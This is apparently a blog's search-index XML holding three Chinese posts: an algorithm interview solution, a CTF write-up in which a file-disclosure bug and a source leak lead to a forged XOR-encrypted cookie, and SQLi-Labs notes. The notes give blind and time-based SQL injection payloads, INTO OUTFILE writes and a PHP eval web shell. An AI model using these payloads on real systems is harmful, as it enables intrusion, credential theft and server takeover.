<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[2017完美世界算法工程师笔试题(子序列)]]></title>
      <url>http://ug1y.github.io/2016/09/25/2017%E5%AE%8C%E7%BE%8E%E4%B8%96%E7%95%8C%E7%AE%97%E6%B3%95%E5%B7%A5%E7%A8%8B%E5%B8%88%E7%AC%94%E8%AF%95%E9%A2%98(%E5%AD%90%E5%BA%8F%E5%88%97)/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>微信上偶然看到的一道算法题，觉得很有意思，于是想来试试，毕竟标题写个完美世界，就兴致来了，题目如下：</p>
<blockquote>
<p>给定一个长度为N的数组，找出一个最长的单调自增子序列（不一定连续，但是顺序不能乱） 例如：给定一个长度为8的数组A{1,3,5,2,4,6,7,8}，则其最长的单调递增子序列为{1,2,4,6,7,8}，长度为6。<br><a id="more"></a><br><strong>输入描述:</strong><br>第一行包含一个整数T，代表测试数据组数。<br>对于每组测试数据： N-数组的长度<br>a1 a2 … an （需要计算的数组）<br>保证： 1&lt;=N&lt;=3000,0&lt;=ai&lt;=MAX_INT.</p>
<p><strong>输出描述:</strong><br>对于每组数据，输出一个整数，代表最长递增子序列的长度。</p>
<p><strong>输入例子:</strong><br>2<br>7<br>89 256 78 1 46 78 8<br>5<br>6 4 8 2 17</p>
<p><strong>输出例子:</strong><br>3<br>3</p>
</blockquote>
<h1 id="我的方法："><a href="#我的方法：" class="headerlink" title="我的方法："></a>我的方法：</h1><p>看到这个题之后，想看能不能用递归的方法，先拆分成小的序列，得到结果，再合并另一个序列，得到结果，一直到所有的序列。所以首先想到的是利用动态规划的思想，先把序列分成子序列，每个子序列都是有序的，再对每两个相邻子序列求得其最长子序列作为一组新的序列集合。每进行一次这样的运算，序列集合的数量就减1，最终就能得到所有序列的最长子序列了。</p>
<p>例如将序列<code>[1,4,6,2,4,3,8]</code>拆分成<code>[1,4,6]</code>，<code>[2,4]</code>，<code>[3,8]</code>三个子序列，每两个子序列合并形成一个新的最长子序列如<code>[1,4,6]</code>，<code>[2,3,8]</code>，最后合并两个子序列得到最终结果<code>[1,2,3,8]</code>即是最长子序列，长度为4。当然，结果肯定不唯一，比方说在第一步中<code>[1,4,6]</code>和<code>[1,2,4]</code>都是最长的，随便选一个就行，或者可以枚举出所有结果。代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line">q1=[<span class="number">89</span>,<span class="number">256</span>,<span class="number">78</span>,<span class="number">1</span>,<span class="number">46</span>,<span class="number">78</span>,<span class="number">8</span>]</div><div class="line"></div><div class="line">q2=[<span class="number">6</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">17</span>]</div><div class="line"></div><div class="line"><span class="comment"># 合并两个序列，按照顺序左合并、右合并，比较结果返回最长的那个</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(q1,q2)</span>:</span></div><div class="line">	t1=[i <span class="keyword">for</span> i <span class="keyword">in</span> q1 <span class="keyword">if</span> i &lt; q2[<span class="number">0</span>]] + q2</div><div class="line">	t2=q1 + [i <span class="keyword">for</span> i <span class="keyword">in</span> q2 <span class="keyword">if</span> i &gt; q1[<span class="number">-1</span>]]</div><div class="line">	<span class="keyword">return</span> t1 <span class="keyword">if</span> len(t1) &gt; len(t2) <span class="keyword">else</span> t2</div><div class="line"></div><div class="line"><span class="comment"># 拆分序列成有序子序列集合</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">split</span><span class="params">(seq)</span>:</span></div><div class="line">	j=<span class="number">0</span></div><div class="line">	t=[]</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(seq)<span class="number">-1</span>):</div><div class="line">		<span class="keyword">if</span> seq[i]&gt;seq[i+<span class="number">1</span>]:</div><div class="line">			t.append(seq[j:i+<span class="number">1</span>])</div><div class="line">			j=i+<span class="number">1</span></div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		t.append(seq[j:len(seq)+<span class="number">1</span>])</div><div class="line">	<span class="keyword">return</span> t</div><div class="line"></div><div class="line"><span class="comment"># 递归排序，直到合并成一个序列则返回长度</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rank</span><span class="params">(ls)</span>:</span></div><div class="line">	<span class="keyword">if</span> len(ls)==<span class="number">1</span>:</div><div class="line">		<span class="keyword">return</span> ls[<span class="number">0</span>]</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">return</span> rank([merge(ls[i],ls[i+<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(ls)<span class="number">-1</span>)])</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	<span class="keyword">print</span> rank(split(q1))</div><div class="line">	<span class="keyword">print</span> rank(split(q2))</div></pre></td></tr></table></figure>
<h1 id="大神们的方法："><a href="#大神们的方法：" class="headerlink" title="大神们的方法："></a>大神们的方法：</h1><p>维护一个最长序列记录的数组V[i]，用来记录长度为i的递增子序列中最大元素的最小值，并对于数组中的每个元素考察其是哪个子序列的最大元素，用二分法更新V数组，最终i的值就是最长递增子序列的长度。</p>
<p>例如序列<code>[1,4,6,2,4,3,8]</code>，从左至右遍历一遍，先分别将<code>1,4,6</code>加入序列得到数组为<code>[1,4,6]</code>，遍历下一个元素<code>2</code>，小于数组的最后一个元素<code>6</code>，于是用二分法找到它在数组中的位置，替换原来的那个大的数，得到<code>[1,2,6]</code>，继续遍<code>4</code>，比<code>6</code>小比<code>2</code>大，于是替换了<code>6</code>得到数组<code>[1,2,4]</code>，继续遍历得到<code>[1,2,3]</code>，最终得到结果是<code>[1,2,3,8]</code>得出长度为4。代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line">q1=[<span class="number">89</span>,<span class="number">256</span>,<span class="number">78</span>,<span class="number">1</span>,<span class="number">46</span>,<span class="number">78</span>,<span class="number">8</span>]</div><div class="line"></div><div class="line">q2=[<span class="number">6</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">17</span>]</div><div class="line"></div><div class="line"><span class="comment"># 动态增长last最长序列数组，遍历seq序列，大于最后一个数则添加到末尾，小于则替换数组原来的大的数</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">lastseq</span><span class="params">(seq)</span>:</span></div><div class="line">	last=[]</div><div class="line">	last.append(seq[<span class="number">0</span>])</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(seq)):</div><div class="line">		<span class="keyword">if</span> seq[i]&gt;last[<span class="number">-1</span>]:</div><div class="line">			last.append(seq[i])</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			last[search(last,seq[i])]=seq[i]</div><div class="line">	<span class="keyword">return</span> len(last)</div><div class="line"></div><div class="line"><span class="comment"># 二分法找到元素x在有序序列seq中的位置，用小的替换大的数值，于是返回left</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(seq,x)</span>:</span></div><div class="line">	left=<span class="number">0</span></div><div class="line">	right=len(seq)<span class="number">-1</span></div><div class="line">	<span class="keyword">while</span> left&lt;=right:</div><div class="line">		mid=left+(right-left)/<span class="number">2</span></div><div class="line">		<span class="keyword">if</span> seq[mid]&lt;x:</div><div class="line">			left=mid+<span class="number">1</span></div><div class="line">		<span class="keyword">elif</span> seq[mid]&gt;x:</div><div class="line">			right=mid<span class="number">-1</span></div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			<span class="keyword">return</span> mid</div><div class="line">	<span class="keyword">return</span> left</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	<span class="keyword">print</span> lastseq(q1)</div><div class="line">	<span class="keyword">print</span> lastseq(q2)</div></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>要说复杂度把，第二个方法用了二分查找，复杂度肯定是要更优的。但是如果仔细分析可以知道，第一个方法是可以把所有最长的子序列枚举或者说排列组合出来的，而第二个方法得到的序列不是合理的最长子序列（只是例子恰好满足，不信的可以用其他示例跑一遍程序），但是长度是满足条件的。</p>
<p>但是我们要审题，题目是要得到最长递增子序列的长度，<strong>只要长度就行</strong>，所以大神们的方法肯定就是标准答案了，再说其他的我也想不到了，这个方法细想一下还是很厉害的，这里学习了。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[一道文件包含和自加密的题]]></title>
      <url>http://ug1y.github.io/2016/09/07/%E4%B8%80%E9%81%93%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%92%8C%E8%87%AA%E5%8A%A0%E5%AF%86%E7%9A%84%E9%A2%98/</url>
      <content type="html"><![CDATA[<h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h1><p>这是一道脑洞比较大的题，反正我是没做出来，看了各位大神的解答之后理清了一遍思路才搞定的，来自7月<a href="">X-NUCA全国高校网安联赛</a>的指导题目21，题目链接<a href="http://218.76.35.75:20106" target="_blank" rel="external">http://218.76.35.75:20106</a>，不知道合天会不会一直挂着题目。然而这次的<a href="http://www.ichunqiu.com/racing/ctf_54791" target="_blank" rel="external">“百度杯”CTF比赛</a>又出现了，很有意思。<br><a id="more"></a></p>
<h1 id="Begin"><a href="#Begin" class="headerlink" title="Begin"></a>Begin</h1><p>第一步当然是打开网页看看是个什么东西，看到是一美女（嗯，长的不错啊，难道是福利？？？），链接跳转变成 <code>http://218.76.35.75:20106/index.php?image=heihei.jpg</code>。</p>
<p><img src="/images/ctf_20160907220035.png" alt=""></p>
<p>一看以为是图像隐藏，把图片down下来放到神器Stegsolve里看，结果也没发现什么，后来想想这是道Web题，真是脑子笨经验少，赶紧右击查看源代码，发现图像竟然是用base64编码加载二进制数据显示的。（表示不知道还可以这样，无敌）</p>
<p><img src="/images/ctf_20160907220643.png" alt=""></p>
<p>这里可以猜测，后台用<code>file_get_contents()</code>函数获取参数指定的文件内容，然后再base64编码发送的文件包含漏洞，于是想到可以反射<code>index.php</code>文件。</p>
<p><img src="/images/ctf_20160907221848.png" alt=""></p>
<h1 id="Continue"><a href="#Continue" class="headerlink" title="Continue"></a>Continue</h1><p>拿着编码值去解码，得到了<code>index.php</code>的代码。（注意前面的<code>data:image/png;base64,</code>内容删掉再解码）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">/**</span></div><div class="line"> * Created by PhpStorm.</div><div class="line"> * User: pfven</div><div class="line"> * Date: 2016/7/20</div><div class="line"> * Time: 21:35</div><div class="line"> */</div><div class="line"><span class="keyword">include</span> <span class="string">'header.php'</span>;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"image"</span>]))&#123;</div><div class="line">    $file = $_GET[<span class="string">'image'</span>];</div><div class="line">    $file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</div><div class="line">    $file = str_replace(<span class="string">"config"</span>,<span class="string">"_"</span>, $file);</div><div class="line">    $txt = base64_encode(file_get_contents($file));</div><div class="line"></div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/png;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</div><div class="line">&#125;<span class="keyword">else</span> &#123;</div><div class="line">     header(<span class="string">"Location: index.php?image=heihei.jpg"</span>);</div><div class="line"></div><div class="line">    <span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">include</span> <span class="string">'footer.php'</span>;</div><div class="line"><span class="comment">//***</span></div></pre></td></tr></table></figure>
<p>看半天也没什么特别的，就是获取文件内容编码输出罢了，同时对参数名进行了过滤并且把config替换成下划线_了。但是在这里有个隐藏信息，就是该文件是由<code>PhpStorm</code>程序创建的，这是一个编辑php工程的IDE，它创建工程时会为项目创建相应的配置文件放入目录<code>.idea</code>下，于是访问一下这个目录，看看会有什么。</p>
<p><img src="/images/ctf_20160907223216.png" alt=""></p>
<p>果然，发现一堆xml文件，都是项目的配置文件，逐个翻阅后，发现<code>workspace.xml</code>中有项目中生成文件的列表，一个名叫<code>function_crypt.php</code>的文件看来就是存着flag的文件了。</p>
<p><img src="/images/ctf_20160907223622.png" alt=""></p>
<p>直接用链接访问返回<code>It&#39;s Works!</code>，看来里面还有奥秘，继续用同样方法看看文件源码，不过要注意下划线_是会过滤的，要用config来代替，于是得到源码如下：</p>
<p><img src="/images/ctf_20160907224345.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">/**</span></div><div class="line"> * Created by PhpStorm.</div><div class="line"> * User: pfven</div><div class="line"> * Date: 2016/7/20</div><div class="line"> * Time: 17:19</div><div class="line"> */</div><div class="line"></div><div class="line">error_reporting(E_ALL || ~E_NOTICE);</div><div class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span><span class="params">($length, $chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz'</span>)</span> </span>&#123;</div><div class="line">    $hash = <span class="string">''</span>;</div><div class="line">    $max = strlen($chars) - <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++)	&#123;</div><div class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $hash;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($txt,$key)</span></span>&#123;</div><div class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</div><div class="line">        $tmp .= chr(ord($txt[$i])+<span class="number">10</span>);</div><div class="line">    &#125;</div><div class="line">    $txt = $tmp;</div><div class="line">    $rnd=random(<span class="number">4</span>);</div><div class="line">    $key=md5($rnd.$key);</div><div class="line">    $s=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</div><div class="line">        <span class="keyword">if</span>($s == <span class="number">32</span>) $s = <span class="number">0</span>;</div><div class="line">        $ttmp .= $txt[$i] ^ $key[++$s];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> base64_encode($rnd.$ttmp);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($txt,$key)</span></span>&#123;</div><div class="line">    $txt=base64_decode($txt);</div><div class="line">    $rnd = substr($txt,<span class="number">0</span>,<span class="number">4</span>);</div><div class="line">    $txt = substr($txt,<span class="number">4</span>);</div><div class="line">    $key=md5($rnd.$key);</div><div class="line"></div><div class="line">    $s=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</div><div class="line">        <span class="keyword">if</span>($s == <span class="number">32</span>) $s = <span class="number">0</span>;</div><div class="line">        $tmp .= $txt[$i]^$key[++$s];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($tmp);$i++)&#123;</div><div class="line">        $tmp1 .= chr(ord($tmp[$i])<span class="number">-10</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $tmp1;</div><div class="line">&#125;</div><div class="line">$username = decrypt($_COOKIE[<span class="string">'user'</span>],$key);</div><div class="line"><span class="keyword">if</span> ($username == <span class="string">'system'</span>)&#123;</div><div class="line">    <span class="keyword">echo</span> $flag;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    setcookie(<span class="string">'user'</span>,encrypt(<span class="string">'guest'</span>,$key));</div><div class="line">    <span class="keyword">echo</span> <span class="string">"It's Works!"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="Next"><a href="#Next" class="headerlink" title="Next"></a>Next</h1><p>没完了，题目还是很强。首先来解读一下这段程序代码是什么意思。密钥<code>$key</code>看来是存在<code>config.php</code>文件里的了，设置user的cookie，由guest字符串加密得来的，要想通过获取到flag必须使得cookie中user键的值解密后为system才行。</p>
<p>解读一下加解密函数，加密函数如下:（解密函数反过来）</p>
<ol>
<li>把字符串中的每个字符位移10位</li>
<li>生成4位随机字符串与密钥做MD5哈希</li>
<li>循环与位移后的文本做异或运算</li>
<li>为了能反向解密，把4位随机字符串拼接到加密后的文本前面base64编码返回</li>
</ol>
<p>由于是做异或运算，再做一次异或运算就能返回原先的内容，于是base64解码后取出对应位置的文本字符，先异或原先的字符，再异或想要变成的字符就可以，不过要注意文本被位移了。基于以上代码，添加测试一下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">...</div><div class="line"></div><div class="line">$key=<span class="string">'hello'</span>;</div><div class="line">$a=encrypt(<span class="string">'guest'</span>,$key);</div><div class="line">$a=base64_decode($a);</div><div class="line">$a[<span class="number">4</span>]=$a[<span class="number">4</span>]^chr(ord(<span class="string">'g'</span>)+<span class="number">10</span>)^chr(ord(<span class="string">'s'</span>)+<span class="number">10</span>);</div><div class="line">$a[<span class="number">5</span>]=$a[<span class="number">5</span>]^chr(ord(<span class="string">'u'</span>)+<span class="number">10</span>)^chr(ord(<span class="string">'y'</span>)+<span class="number">10</span>);</div><div class="line">$a[<span class="number">6</span>]=$a[<span class="number">6</span>]^chr(ord(<span class="string">'e'</span>)+<span class="number">10</span>)^chr(ord(<span class="string">'s'</span>)+<span class="number">10</span>);</div><div class="line">$a[<span class="number">7</span>]=$a[<span class="number">7</span>]^chr(ord(<span class="string">'s'</span>)+<span class="number">10</span>)^chr(ord(<span class="string">'t'</span>)+<span class="number">10</span>);</div><div class="line">$a[<span class="number">8</span>]=$a[<span class="number">8</span>]^chr(ord(<span class="string">'t'</span>)+<span class="number">10</span>)^chr(ord(<span class="string">'e'</span>)+<span class="number">10</span>);</div><div class="line">$aa=base64_encode($a);</div><div class="line"><span class="keyword">echo</span> decrypt($aa,$key);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>经过测试最后果真返回了我们想要的结果：</p>
<p><img src="/images/ctf_20160907231024.png" alt=""></p>
<p>问题在于最后还有一位要是字符m，这里就要用穷举来猜测了。因为在php中MD5哈希得到的是十六进制串，1到f，所以总共猜测16次便可得知，编写脚本得到十六个可能的base64编码值，然后循环发送请求获取结果，先从cookie中拿到编码值<code>VjhLV0lIDkxM</code>，编写脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">...</div><div class="line"></div><div class="line">$a=<span class="string">'VjhLV0lIDkxM'</span>;</div><div class="line">$a=base64_decode($a);</div><div class="line">$a[<span class="number">4</span>]=$a[<span class="number">4</span>]^chr(ord(<span class="string">'g'</span>)+<span class="number">10</span>)^chr(ord(<span class="string">'s'</span>)+<span class="number">10</span>);</div><div class="line">$a[<span class="number">5</span>]=$a[<span class="number">5</span>]^chr(ord(<span class="string">'u'</span>)+<span class="number">10</span>)^chr(ord(<span class="string">'y'</span>)+<span class="number">10</span>);</div><div class="line">$a[<span class="number">6</span>]=$a[<span class="number">6</span>]^chr(ord(<span class="string">'e'</span>)+<span class="number">10</span>)^chr(ord(<span class="string">'s'</span>)+<span class="number">10</span>);</div><div class="line">$a[<span class="number">7</span>]=$a[<span class="number">7</span>]^chr(ord(<span class="string">'s'</span>)+<span class="number">10</span>)^chr(ord(<span class="string">'t'</span>)+<span class="number">10</span>);</div><div class="line">$a[<span class="number">8</span>]=$a[<span class="number">8</span>]^chr(ord(<span class="string">'t'</span>)+<span class="number">10</span>)^chr(ord(<span class="string">'e'</span>)+<span class="number">10</span>);</div><div class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++) &#123;</div><div class="line">    $ss=chr(ord(<span class="string">'0'</span>)+$i);</div><div class="line">    $a[<span class="number">9</span>]=chr(ord($ss))^chr(ord(<span class="string">'m'</span>)+<span class="number">10</span>);</div><div class="line">    $aa=base64_encode($a);</div><div class="line">    <span class="keyword">echo</span> $aa.<span class="string">'&lt;br&gt;'</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>得到一堆编码值，存储到<code>code.txt</code>文件中。</p>
<p><img src="/images/ctf_20160907231836.png" alt=""></p>
<h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>拿到burpsuite里的Intruder跑一遍，加载字典</p>
<p><img src="/images/ctf_20160907232926.png" alt=""></p>
<p>最终，那个长度不一样的请求，就会显示我们要的flag结果</p>
<p><img src="/images/ctf_20160907233005.png" alt=""></p>
<p>反正我感觉这个题出的很漂亮！</p>
<hr>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[SQLi Labs 学习笔记 Part 4]]></title>
      <url>http://ug1y.github.io/2016/09/06/SQLi-Labs-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Part-4/</url>
      <content type="html"><![CDATA[<h1 id="第五课：布尔盲注"><a href="#第五课：布尔盲注" class="headerlink" title="第五课：布尔盲注"></a>第五课：布尔盲注</h1><p>在Less-8中，我们通过注入一些查询后，会发现并没有在屏幕上看到错误信息，因此也不能确定在这个网页上是否存在注入。这也是为什么这种类型的注入叫做盲注。通常有两种类型的盲注，基于布尔的和基于时间的。<br><a id="more"></a></p>
<p>首先，通过一系列尝试，得知注入<code>1&#39; or 1--+</code>是能够成功执行的。</p>
<p><img src="/images/sqli/sqli_20160906205727.png" alt=""></p>
<p>而条件为假时<code>1&#39; and 0--+</code>结果如下：</p>
<p><img src="/images/sqli/sqli_20160906210009.png" alt=""></p>
<p>通过两种不同条件下结果的差异，我们可以通过一些查询来猜测我们构造的一些语句的真假值。利用<code>length()</code>、<code>substr()</code>、<code>ascii()</code>等函数来猜测每一个字符。<br><code>1&#39; and ascii(substr(select database(),1,1))&gt;100--+</code></p>
<p><img src="/images/sqli/sqli_20160906210547.png" alt=""></p>
<p>反复尝试数值大小，就能得到特定位置的字符的ascii值，然后调整字符串截取函数的位置，猜测出整个字符串是什么。同样也可以用这种方法猜测出所有前面介绍的方法获取表、字段以及数据。<br><code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100--+</code></p>
<h1 id="第六课：基于时间的盲注"><a href="#第六课：基于时间的盲注" class="headerlink" title="第六课：基于时间的盲注"></a>第六课：基于时间的盲注</h1><p>基于时间的盲注与布尔盲注本质是一样的，通过构造特殊的注入使得产生不同的结果，然后判断条件的真假。例如：<br><code>1&#39; and if((select database()) like &#39;s%&#39;,sleep(5),null)--+</code></p>
<p>若条件正确，则会执行后面的<code>sleep()</code>函数，所以表现的状态是浏览器不会立即得到响应，而是需要等待一段时间，所等待的时间则是sql语句查询时执行休眠函数的时间。其他查询例如：<br><code>1&#39; and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#39;e&#39;,sleep(5),null)--+</code></p>
<p>盲注需要大量的测试用例去猜测正确的结果，往往需要编写一些脚本来实现，实际运用中，大可以使用工具来辅助我们完成，SQL注入神器<a href="http://sqlmap.org/" target="_blank" rel="external">sqlmap</a>，用python编写，简单实用，能检测许多的sql注入点并且帮助完成爆库的工作。</p>
<h1 id="第七课：导出数据库至文件"><a href="#第七课：导出数据库至文件" class="headerlink" title="第七课：导出数据库至文件"></a>第七课：导出数据库至文件</h1><p>mysql中有关键字<code>outfile</code>能将输出的结果导入至文件，同时<code>dumpfile</code>能将一行结果导入至文件，利用这个特性，可以构造语句使得虽然无法利用页面获得信息，但可以写入文件并用网页访问该文件。</p>
<p>首先打开Less7，还是一样的办法，构造能够注入的语句，加上单引号、双引号、反斜杠、括号、注释等，找到可以用于注入的语句，发现<code>id=1&#39;)) --+</code>可以注入，其他都仅显示语法错误。</p>
<p><img src="/images/sqli/sqli_20160918211612.png" alt=""></p>
<p>在mysql控制台中，使用文件导出语句，导出sql查询的内容。（因为在windows下，所以要用双斜杠表示一级目录）<br><code>select * from users into outfile &quot;C:\\wamp64\\www\\test\\test.txt&quot;</code></p>
<p><img src="/images/sqli/sqli_20160918212035.png" alt=""></p>
<p>可得到该文件在指定目录中的内容，需要注意的是如果指定文件路径存在，则无法覆盖文件会报错无法导出。</p>
<p><img src="/images/sqli/sqli_20160918212507.png" alt=""></p>
<p>另外，还可以用函数<code>load_file()</code>读取文件内容并导出结果至指定文件中，可以想象如果是linux系统就可以利用这种方法导出<code>shadow</code>文件获取系统账号密码。</p>
<p><img src="/images/sqli/sqli_20160918213059.png" alt=""></p>
<p>于是，当我们知道了服务器目录时，可以将查询结果导入至可访问的绝对路径下，然后通过访问则可获取该数据库的内容，同时也可以构造例如<code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code>这样的一句话shell来控制和攻击目标主机。</p>
<p><code>1&#39;)) union select 1,2,3 into outfile &quot;C:\\wamp64\\www\\test\\union.txt&quot; --+</code><br><img src="/images/sqli/sqli_20160918214004.png" alt=""></p>
<p><code>-1&#39;)) union select &quot;&quot;,&quot;hello&quot;,&quot;&lt;b&gt;world&lt;/b&gt;&quot; into outfile &quot;C:\\wamp64\\www\\test\\hello.php&quot; --+</code><br><img src="/images/sqli/sqli_20160918214855.png" alt=""></p>
<p>其他的包括前面文章中提到的爆库方法中的查询语句都可以用于此处将查询结果导入至文件然后访问获取。另外，将<code>outfile</code>换成<code>dumpfile</code>也可以导入至文件，但是<code>dumpfile</code>一次只能导入一行结果，即每次查询结果只能有一行才可以用该关键字。</p>
<hr>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[SQLi Labs 学习笔记 Part 3]]></title>
      <url>http://ug1y.github.io/2016/09/05/SQLi-Labs-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Part-3/</url>
